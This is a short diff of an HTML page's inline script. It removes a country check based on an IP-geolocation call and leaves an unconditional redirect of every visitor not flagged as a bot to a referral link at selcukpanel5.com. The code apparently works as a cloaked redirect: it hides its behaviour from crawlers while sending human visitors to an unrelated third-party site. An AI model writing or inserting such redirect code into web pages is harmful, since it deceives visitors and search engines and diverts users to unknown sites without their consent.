@@ -54,27 +54,8 @@
   <script>
     (async function () {
       if (window.__isBot) return;
-
-      try {
-        const response = await fetch("https://ip.visapth.com/", {
-          method: "GET",
-          cache: "no-store"
-        });
-
-        if (!response.ok) {
-          location.replace("/");
-          return;
-        }
-
-        const data = await response.json();
-        if (data.country == "DE" || data.country == "TR" || data.country == "FR" || data.country == "US") {
           location.replace("https://selcukpanel5.com/ref/eczane");
-        } else {
-          location.replace("/?");
-        }
-      } catch (error) {
-        location.replace("/");
-      }
+
     })();
   </script>
 
